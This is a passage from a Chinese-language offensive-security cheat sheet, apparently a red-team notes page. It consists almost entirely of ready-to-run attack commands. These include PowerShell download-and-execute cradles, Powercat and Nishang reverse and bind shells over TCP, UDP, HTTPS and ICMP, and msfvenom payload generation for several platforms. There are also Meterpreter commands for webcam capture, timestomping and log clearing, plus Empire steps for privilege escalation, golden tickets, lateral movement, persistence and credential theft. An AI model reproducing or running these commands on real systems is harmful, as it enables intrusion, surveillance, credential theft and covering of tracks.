src="./img/199.png" alt="image"><br><img src="./img/200.png" alt="image"></p><h3 id="DNS-TXT-Command"><a href="#DNS-TXT-Command" class="headerlink" title="DNS TXT Command"></a>DNS TXT Command</h3><pre><code>https://github.com/samratashok/nishang/Utility/Out-DnsTxt.ps1https://github.com/samratashok/nishang/Backdoors/DNS_TXT_Pwnage.ps1新建一个psh文件，使用out-dnstxt转换，这里的命令是net user</code></pre><p><img src="./img/201.png" alt="image"><br><img src="./img/202.png" alt="image"></p><pre><code>y0stUSgtTi3i5QIA添加一条域名txt记录，这里在本地设置，正常是在域名商的网站里配置</code></pre><p><img src="./img/203.png" alt="image"></p><pre><code>还需创建两个txt记录，分别是指定开始和结束的字符串</code></pre><p><img src="./img/204.png" alt="image"><br><img src="./img/205.png" alt="image"></p><pre><code>靶机执行&gt;Import-Module .\DNS_TXT_Pwnage.ps1&gt;DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop</code></pre><p><img src="./img/206.png" alt="image"></p><h3 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="MSF-Powershell"><a href="#MSF-Powershell" class="headerlink" title="MSF+Powershell"></a>MSF+Powershell</h4><pre><code>反弹MSF靶机PS &gt;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&#39;) PS &gt;Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force攻击机：&gt;use exploit/multi/handler&gt;set payload windows/x64/meterpreter/reverse_ https&gt;run或&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&quot;)&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/ps&quot;)&gt;Invoke-Shellcode -Shellcode ($buf)或&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection &gt;/var/www/html/a.ps1&gt;powershell -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/a.ps1&#39;)&quot;</code></pre><h4 id="Powercat-1"><a href="#Powercat-1" class="headerlink" title="Powercat"></a>Powercat</h4><pre><code>&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)正向连接靶机:powercat -l -p 8080 -e cmd.exe –v攻击机:nc 192.168.0.1 8080 –vv反向连接：攻击机：nc –l –p 8080 –vv靶机:powercat –c 192.168.0.1 –p 8080 –v –e cmd.exe远程执行&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powercat/powercat.ps1&#39;); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe&quot;正向连接靶机:powercat -l -p 8080 -e cmd.exe -v攻击机:nc 192.168.0.1 8080 -vv反向连接：攻击机：nc -l -p 8080 -vv靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe</code></pre><p><img src="./img/207.png" alt="image"></p><h4 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h4><h5 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h5><pre><code>靶机：&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Bind -Port 12138&quot;攻击机：&gt;nc 靶机IP 12138</code></pre><h5 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h5><pre><code>攻击机：&gt;nc -vnlp 9999靶机：&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 9999&quot;</code></pre><h5 id="UDP反向shell"><a href="#UDP反向shell" class="headerlink" title="UDP反向shell"></a>UDP反向shell</h5><pre><code>攻击机：&gt;nc -lvup 12138靶机：&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 12138&quot;</code></pre><h5 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h5><pre><code>攻击机：&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1&#39;); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443&quot;  IP地址是本机IP</code></pre><p><img src="./img/208.png" alt="image"></p><pre><code>靶机：&gt;powershell -w hidden -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.98:8080/connect&#39;)</code></pre><p><img src="./img/209.png" alt="image"></p><h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><pre><code>攻击机IP:108靶机IP:100https://github.com/inquisb/icmpsh靶机执行&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp 192.168.0.108</code></pre><p><img src="./img/210.png" alt="image"></p><pre><code>攻击机执行，开启相应ICMP ECHO请求&gt;sysctl -w net.ipv4.icmp_echo_ignore_all=1&gt;./icmpsh_m.py 192.168.0.108 192.168.0.100</code></pre><p><img src="./img/211.png" alt="image"></p><h4 id="Base64-2"><a href="#Base64-2" class="headerlink" title="Base64"></a>Base64</h4><pre><code>&gt;Powershell &quot;$string=&quot;net user&quot;;[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))&quot;</code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h4 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a>常规使用</h4><pre><code>#systemctl start postgresql.service 启动数据库服务#msfdb init 初始化数据库#msfconsole进入MSF框架#search  ms17-010 查找攻击模块#use exploit/windows/smb/ms17_010_eternalblue 使用模块 #set payload windows/x64/meterpreter/reverse_tcp 设置载荷#info 查看信息#show options查看需要设置的参数#set RHOST 192.168.125.138设置参数#exploit 执行攻击模块#back 回退</code></pre><h4 id="技巧使用"><a href="#技巧使用" class="headerlink" title="技巧使用"></a>技巧使用</h4><pre><code>#handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcp快速监听#setg 设置全局参数#set autorunscript migrate –f 自动迁移进程#set autorunscript migrate -n explorer.exe#set AutoRunScript post/windows/manage/migrate#set prependmigrate true 自动注入进程#set prependmigrateProc svchost.exe#set exitonsession false获取到session后继续监听，获得多个session#set stagerverifysslcert false 防止出现ssl错误#set SessionCommunicationTimeout 0 防止session超时退出#set SessionExpirationTimeout 0 防止强制关闭session#exploit -j -z  后台持续监听&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b &quot;x00&quot; -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe 执行后注入到已存在的一个进程&gt;set EnableStageEncoding true&gt;set stageencoder x86/fnstenv_mov 编码进行免杀&gt;set stageencodingfallback false</code></pre><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><h5 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h5><pre><code>#show auxiliary 查看所有模块</code></pre><h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><pre><code>#show payloads 查看所有攻击载荷Payload是目标被攻击时执行的实际功能代码生成载荷#use exploit/multi/script/web_delivery&gt;set target 2&gt;msfvenom --list payloads 列出所有payload&gt;msfvenom --list encoders 列出所有编码器</code></pre><h6 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h6><pre><code>#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe -o /root/1.exe#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o 1.exe#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f psh-reflection &gt;xxx.ps1#msfvenom -a x64 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1&gt;msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.0.1 LPORT=11111  -f exe&gt; /root/1.exe  生成NC正向连接&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe&gt; 1.exe 生成NC反向连接</code></pre><h6 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h6><pre><code>#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e -f elf -a x86 --platform linux -o shell#msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.sh</code></pre><h6 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h6><pre><code>#msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f macho &gt; shell.macho</code></pre><h6 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h6><pre><code>#msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.php#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f war &gt; shell.war#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f aspx -o payload.aspx#msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.jsp#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f asp &gt; shell.asp</code></pre><h6 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h6><pre><code>#msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f apk -o payload.apk#msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 -f raw &gt; shell.apk#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 R &gt; test.apk</code></pre><h6 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h6><pre><code>#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.1 LPORT=11111 -f c –o /root/1.c#msfvenom -p cmd/unix/reverse_python LHOST=192.168.0.1 LPORT=11111 -o shell.py#msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.py#msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.pl#msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.rb#msfvenom -p cmd/unix/reverse_lua LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.lua</code></pre><h6 id="msf设置监听"><a href="#msf设置监听" class="headerlink" title="msf设置监听"></a>msf设置监听</h6><pre><code>#use exploit/multi/handler#set payloadwindows/meterpreter/reverse_http 指定相应的payload#set LHOST 192.168.0.1#set LPORT 11111#exploit -j 后台监听或在exploit模块中直接使用set payload 命令指定payload</code></pre><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h5 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h5><pre><code>当攻击成功后会返回会话，使用session -l命令列出当前获取到的会话#session -l使用#sessions -i id 来进入一个会话进行交互#background 将当前会话放置后台#sessions -x检查心跳#sessions -u [ID] cmdshell升级meterpreter shell</code></pre><h5 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h5><pre><code>提权详见提权模块</code></pre><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><pre><code>#shell 进入目标cmdshell#uictl [enable/disable] [keyboard/mouse/all]  开启或禁止键盘/鼠标#uictl disable mouse  禁用鼠标#uictl disable keyboard  禁用键盘#webcam_list   查看摄像头#webcam_snap   通过摄像头拍照#webcam_stream  通过摄像头开启视频#execute -H -i -f cmd.exe 执行cmd.exe，-H不可见，-i交互 #execute -H -m -d calc.exe -f wce.exe -a &quot;-o 1.txt&quot; 隐藏执行#ps查看当前活跃进程#migrate pid     迁移进程#kill pid   #杀死进程</code></pre><h5 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h5><pre><code>#pwd 查看当前目录#ls 列出当前目录文件#search -f *pass*        搜索文件#cat c:\\passwd.txt   查看文件内容#upload /tmp/pwn.txt C:\\1.txt   上传文件#download c:\\passwd.txt /tmp/  下载文件#edit c:\\1.txt  编辑或创建文件#rm C:\\1.txt 删除文件#mkdir folder  创建文件夹#rmdir folder  删除文件夹#lcd /tmp   #攻击者主机 切换目录#timestomp -v C://2.txt   #查看时间戳#timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</code></pre><h5 id="后渗透-amp-权限维持"><a href="#后渗透-amp-权限维持" class="headerlink" title="后渗透&amp;权限维持"></a>后渗透&amp;权限维持</h5><pre><code>路由添加，socks建立，后门建立等查看查看后门&amp;持久化板块</code></pre><h5 id="清理日志"><a href="#清理日志" class="headerlink" title="清理日志"></a>清理日志</h5><pre><code>#clearev </code></pre><h4 id="MSF派生Cobalt-strike和Empire"><a href="#MSF派生Cobalt-strike和Empire" class="headerlink" title="MSF派生Cobalt strike和Empire"></a>MSF派生Cobalt strike和Empire</h4><h5 id="派生Empire"><a href="#派生Empire" class="headerlink" title="派生Empire"></a>派生Empire</h5><pre><code>Empire创建一个Listener创建一个stager选择windows/dllMSF使用&gt;use post/windows/manage/reflective_dll_inject 指定session，dll的路径，进程pid</code></pre><h5 id="派生Cobalt-Strike"><a href="#派生Cobalt-Strike" class="headerlink" title="派生Cobalt Strike"></a>派生Cobalt Strike</h5><pre><code>cobalt 开启一个监听器windows/beacon_http/reverse_httpmsf &gt;use exploit/windows/manage/payload_inject指定IP、端口、payload即可</code></pre><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>#git clone https://github.com/EmpireProject/Empire.git#cd Empire/setup#./install.sh</code></pre><h4 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h4><pre><code>(Empire) &gt; listeners(Empire: listeners) &gt; uselistener http(Empire: listeners) &gt; info 查看参数信息(Empire: listeners/http) &gt; set Name y(Empire: listeners/http) &gt; set Host http://192.168.0.1(Empire: listeners/http) &gt; set Port 8080(Empire: listeners/http) &gt; execute&gt;back命令返回listeners模块&gt;list查看已激活的listener&gt;kill http删除监听</code></pre><h4 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h4><pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs (双击tab键查看所有模块)(Empire: stager/windows/launcher_vbs) &gt; info必须设置listener的名字，可设置生成位置(Empire: stager/windows/launcher_vbs) &gt; set Listener y(Empire: stager/windows/launcher_vbs) &gt; execute可生成vbs，靶机执行即可上线。使用launcher命令直接生成powershell或python脚本&gt;launcher powershell Listener-Name使用rename对agents更名&gt;rename 6NMCW4ZB target1使用main命令放回主菜单&gt;list stale 列出失去权限的机器&gt;remove stale 去除失去权限的机器</code></pre><h4 id="连接靶机及其他操作"><a href="#连接靶机及其他操作" class="headerlink" title="连接靶机及其他操作"></a>连接靶机及其他操作</h4><pre><code>&gt;interact target1 连接&gt;agent 返回靶机列表&gt;back 返回上一层&gt;shell net user 1 1 /add 执行系统目录格式&gt;mimikazt 加载模块获取密码&gt;creds 整理获取的密码，creds export /root/1.txt 保存密码，creds hash/plaintext，显示格式&gt;sc 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot&gt;download c:\pass.txt 下载靶机文件到本机&gt;upload hacked.txt c:\hacked.txt 上传本机文件到靶机</code></pre><h4 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h4><pre><code>&gt;agents 列表中Username没有星号则需要提权&gt;bypassuac listener需指定一个监听器 提权&gt;usemodule privesc/ms16-032需指定一个监听器 提权&gt;usemodule privesc/powerup/allchecks执行所有脚本检查漏洞</code></pre><h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><pre><code>查询域管登录机器&gt;usemodule situational_awareness/network/powerview/user_hunter</code></pre><h5 id="令牌窃取-1"><a href="#令牌窃取-1" class="headerlink" title="令牌窃取"></a>令牌窃取</h5><pre><code>&gt;mimikatz&gt;creds  获取并整理hash及密码&gt;pth &#123;ID&#125;窃取管理员令牌&gt;steal_token &#123;PID&#125;</code></pre><h5 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h5><pre><code>&gt;ps 查看进程&gt;usemodule management/psinject 设置ProcIP和Listener</code></pre><h5 id="Hash传递"><a href="#Hash传递" class="headerlink" title="Hash传递"></a>Hash传递</h5><pre><code>Invoke-PsExec可能会被查杀&gt;usemodule situational_awareness/network/powerview/find_localadmin_access 列出可PSexec横向移动的机器&gt;usemodule lateral_movement/invoke_psexec需设置ComputerName和Listener或&gt;usemodule lateral_movement/invoke_wmi需设置ComputerName和Listener，credID跨域父域域控：dc.zone.com子域域控：sub.zone.com子域计算机：pc.sub.zone.com子域普通用户：sub\user1查看信任关系&gt;usemodule situational_awareness/network/powerview/get_domain_trust获取父域krbtgt SID，使用management/user_to_sid获取sid需设置Domain和User=krbtgt&gt;usemodule credentials/mimikatz/dcsync 设置UserName 子域\krbtgt 获取子域hash&gt;usemodule credentials/mimikatz/golden_ticket 伪造sid 需设置User为伪造用户 sids伪造的标识符&#123;krbtgt sid&#125;-519&gt;usemodule credentials/mimikatz/dcsync 获取父域krbtgt的hash&gt;usemodule credentials/mimikatz/golden_ticket 使用父域krbtgt进行PTH攻击，指定父域CredID，用户名和域&gt;shell dir \\dc.zone.com\c$</code></pre><h4 id="后门-amp-持久化"><a href="#后门-amp-持久化" class="headerlink" title="后门&amp;持久化"></a>后门&amp;持久化</h4><h5 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h5><pre><code>&gt;usemodule lateral_movement/invoke_wmi_debugger设置Listener，ComputerName(大写)，TargetBinary(sethc.exe, Utilman.exe, osk.exe, Narrator.exe, Magnify.exe)，分别是粘滞键，轻松访问，屏幕键盘，讲述人，放大镜。</code></pre><h5 id="注入注册表启动项"><a href="#注入注册表启动项" class="headerlink" title="注入注册表启动项"></a>注入注册表启动项</h5><pre><code>&gt;usemodule persistence/elevated/registry*设置Listener，注册表路径RegPath [HKLM\software\microsoft\windows\currentversion\run]</code></pre><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><pre><code>&gt;usemodule persistence/elevated/schtasks*设置Listener和DailyTime</code></pre><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h5><pre><code>&gt;usemodule persistence/elevated/wmi设置Listener</code></pre><h5 id="注入SSP"><a href="#注入SSP" class="headerlink" title="注入SSP"></a>注入SSP</h5><pre><code>查看SSP章节</code></pre><p>Collection（信息采集）</p><h4 id="Collection（信息采集）"><a href="#Collection（信息采集）" class="headerlink" title="Collection（信息采集）"></a>Collection（信息采集）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>collection/ChromeDump</td><td>收集chrome浏览器保存的密码和浏览历史记录</td></tr><tr><td>collection/FoxDump</td><td>收集Firefox浏览器保存的密码和浏览历史记录</td></tr><tr><td>collection/USBKeylogger*</td><td>利用ETW作为键盘记录</td></tr><tr><td>collection/WebcamRecorder</td><td>从摄像头捕获视频</td></tr><tr><td>collection/browser_data</td><td>搜索浏览器历史记录或书签</td></tr><tr><td>collection/clipboard_monitor</td><td>按指定的时间间隔监视剪贴板</td></tr><tr><td>collection/file_finder</td><td>查找域中的敏感文件</td></tr><tr><td>collection/find_interesting_file</td><td>查找域中的敏感文件</td></tr><tr><td>collection/get_indexed_item</td><td>获取Windows desktop search索引文件</td></tr><tr><td>collection/get_sql_column_sample_data</td><td>从目标SQL Server返回列信息。</td></tr><tr><td>collection/get_sql_query</td><td>在目标SQL服务器上执行查询</td></tr><tr><td>collection/inveigh</td><td>Windows PowerShell LLMNR/mDNS/NBNS中间人工具</td></tr><tr><td>collection/keylogger</td><td>键盘记录到keystrokes.txt文件中，文件位置/downloads/agentname/keystrokes.txt/agentname</td></tr><tr><td>collection/minidump</td><td>进程的全内存转储，PowerSploit的Out-Minidump.ps1</td></tr><tr><td>collection/netripper</td><td>将NetRipper注入目标进程，该进程使用API挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。</td></tr><tr><td>collection/ninjacopy*</td><td>通过读取原始卷并解析NTFS结构，从NTFS分区卷中复制文件。</td></tr><tr><td>collection/packet_capture*</td><td>使用netsh在主机上启动数据包捕获。</td></tr><tr><td>collection/prompt</td><td>提示当前用户在表单框中输入其凭据，然后返回结果。</td></tr><tr><td>collection/screenshot</td><td>屏幕截图</td></tr><tr><td>collection/vaults/add_keepass_config_trigger</td><td>寻找KeePass配置</td></tr><tr><td>collection/vaults/find_keepass_config</td><td>此模块查找并解析KeePass.config.xml (2.X)和KeePass.config.xml (1.X)文件。</td></tr><tr><td>collection/vaults/get_keepass_config_trigger</td><td>该模块从KeePass 2.X配置XML文件中提取触发器说明</td></tr><tr><td>collection/vaults/keethief</td><td>此模块检索未锁定的KeePass数据库的database mastey key信息</td></tr><tr><td>collection/vaults/remove_keepass_config_trigger</td><td>该模块从Find-KeePassConfig找到的所有KeePass配置中删除所有触发器</td></tr></tbody></table><pre><code>&gt;usemodule collection/ tab补齐查看模块&gt;usemodule collection/screenshot 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot&gt;usemodule collection/keylogger 键盘记录，文件存储在./Empire/download/agent名字/agent.log&gt;usemodule situational_awareness/host/winenum 查看当前用户、AD组、剪切板内容、系统版本、共享、网络信息、防火墙规则&gt;usemodule situational_awareness/network/powerview/share_finder 列出域内所有共享&gt;usemodule situational_awareness/network/arpscan &gt;set Range 192.168.0.1-192.168.0.100 ARP扫描，需设置扫描网段区间&gt;usemodule situational_awareness/network/portscan &gt;set Hosts 192.168.0.1-192.168.0.100 端口扫描，需设置IP或IP段&gt;usemodule situational_awareness/network/reverse_dns DNS信息，需设置IP&gt;set Range 192.168.0.1-192.168.0.100&gt;usemodule situational_awareness/network/powerview/get_domain_controller 查找域控</code></pre><h4 id="Code-execution（代码执行）"><a href="#Code-execution（代码执行）" class="headerlink" title="Code_execution（代码执行）"></a>Code_execution（代码执行）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>code_execution/invoke_dllinjection</td><td>使用PowerSploit的Invoke-DLLInjection将Dll注入您选择的进程ID。</td></tr><tr><td>code_execution/invoke_metasploitpayload</td><td>生成一个新的隐藏PowerShell窗口，该窗口下载并执行Metasploit Payload。这与Metasploit模块theexploit/multi/scripts/web_delivery互动</td></tr><tr><td>code_execution/invoke_ntsd</td><td>使用NT Symbolic Debugger执行Empire launcher代码</td></tr><tr><td>code_execution/invoke_reflectivepeinjection</td><td>使用PowerSploit的Invoke-ReflectivePEInjection进行反射PE注入，将DLL/EXE加载进PowerShell进程中，或者将DLL加载进远程进程中</td></tr><tr><td>code_execution/invoke_shellcode</td><td>使用PowerSploit的Invoke–Shellcode注入Shellcode</td></tr><tr><td>code_execution/invoke_shellcodemsil</td><td>执行shellcode</td></tr></tbody></table><h4 id="Credentials（身份凭证）"><a href="#Credentials（身份凭证）" class="headerlink" title="Credentials（身份凭证）"></a>Credentials（身份凭证）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>credentials/credential_injection*</td><td>运行PowerSploit的Invoke-CredentialInjection创建具有明文凭证的登录，而不会触发事件ID 4648使用显式凭据尝试登录</td></tr><tr><td>credentials/enum_cred_store</td><td>从Windows凭据管理器中转储当前交互用户的纯文本凭据</td></tr><tr><td>credentials/invoke_kerberoast</td><td>为具有非空服务主体名称（SPN）的所有用户请求kerberos票据，并将其提取为John或Hashcat可用格式</td></tr><tr><td>credentials/powerdump*</td><td>使用Posh-SecMod的Invoke-PowerDump从本地系统中转储哈希</td></tr><tr><td>credentials/sessiongopher</td><td>提取WinSCP已保存的会话和密码</td></tr><tr><td>credentials/tokens</td><td>运行PowerSploit的Invoke-TokenManipulation枚举可用的登录令牌，并使用它们创建新的进程</td></tr><tr><td>credentials/vault_credential*</td><td>运行PowerSploit的Get-VaultCredential以显示Windows Vault凭证对象，包括明文Web凭证</td></tr><tr><td>credentials/mimikatz/cache*</td><td>运行PowerSploit的Invoke-Mimikatz函数以提取MSCache(v2) hashes</td></tr><tr><td>credentials/mimikatz/certs*</td><td>运行PowerSploit的Invoke-Mimikatz函数将所有证书提取到本地目录</td></tr><tr><td>credentials/mimikatz/command*</td><td>使用自定义命令运行PowerSploit的Invoke-Mimikatz函数</td></tr><tr><td>credentials/mimikatz/dcsync</td><td>运行PowerSploit的Invoke-Mimikatz函数，以通过Mimikatz的lsadump::dcsync模块提取给定的帐户密码</td></tr><tr><td>credentials/mimikatz/dcsync_hashdump</td><td>运行PowerSploit的Invoke-Mimikatz函数，以使用Mimikatz的lsadump::dcsync模块收集所有域哈希</td></tr><tr><td>credentials/mimikatz/extract_tickets</td><td>运行PowerSploit的Invoke-Mimikatz函数，以base64编码形式从内存中提取kerberos票据</td></tr><tr><td>credentials/mimikatz/golden_ticket</td><td>运行PowerSploit的Invoke-Mimikatz函数以生成黄金票据并将其注入内存</td></tr><tr><td>credentials/mimikatz/keys*</td><td>运行PowerSploit的Invoke-Mimikatz函数以将所有密钥提取到本地目录</td></tr><tr><td>credentials/mimikatz/logonpasswords*</td><td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取纯文本凭据。</td></tr><tr><td>credentials/mimikatz/lsadump*</td><td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取特定的用户哈希。 在域控制器上很有用。</td></tr><tr><td>credentials/mimikatz/mimitokens*</td><td>运行PowerSploit的Invoke-Mimikatz函数以列出或枚举令牌。</td></tr><tr><td>credentials/mimikatz/pth*</td><td>运行PowerSploit的Invoke-Mimikatz函数以执行sekurlsa::pth来创建一个新进程。</td></tr><tr><td>credentials/mimikatz/purge</td><td>运行PowerSploit的Invoke-Mimikatz函数从内存中清除所有当前的kerberos票据</td></tr><tr><td>credentials/mimikatz/sam*</td><td>运行PowerSploit的Invoke-Mimikatz函数从安全帐户管理器（SAM）数据库中提取哈希</td></tr><tr><td>credentials/mimikatz/silver_ticket</td><td>运行PowerSploit的Invoke-Mimikatz函数，以生成服务器/服务的白银票据并将其注入内存。</td></tr><tr><td>credentials/mimikatz/trust_keys*</td><td>运行PowerSploit的Invoke-Mimikatz函数，从域控制器中提取域信任密钥。</td></tr></tbody></table><h4 id="Exfiltration（数据窃取）"><a href="#Exfiltration（数据窃取）" class="headerlink" title="Exfiltration（数据窃取）"></a>Exfiltration（数据窃取）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>exfiltration/egresscheck</td><td>可用于帮助检查主机与客户端系统之间的出口，详细信息：<a href="https://github.com/stufus/egresscheck-framework">https://github.com/stufus/egresscheck-framework</a></td></tr><tr><td>exfiltration/exfil_dropbox</td><td>下载文件到dropbox</td></tr></tbody></table><h4 id="Exploitation（漏洞利用EXP）"><a href="#Exploitation（漏洞利用EXP）" class="headerlink" title="Exploitation（漏洞利用EXP）"></a>Exploitation（漏洞利用EXP）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>exploitation/exploit_eternalblue</td><td>MS17_010永恒之蓝漏洞利用</td></tr><tr><td>exploitation/exploit_jboss</td><td>Jboss漏洞利用</td></tr><tr><td>exploitation/exploit_jenkins</td><td>在未授权访问的Jenkins脚本控制台上运行命令</td></tr></tbody></table><h4 id="Lateral-movement（横向移动）"><a href="#Lateral-movement（横向移动）" class="headerlink" title="Lateral_movement（横向移动）"></a>Lateral_movement（横向移动）</h4><table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>lateral_movement/inveigh_relay</td><td>smb中继攻击</td></tr><tr><td>lateral_movement/invoke_dcom</td><td>使用DCOM在远程主机上执行stager</td></tr><tr><td>lateral_movement/invoke_executemsbuild</td><td>该模块利用WMI和MSBuild编译并执行一个包含Empire 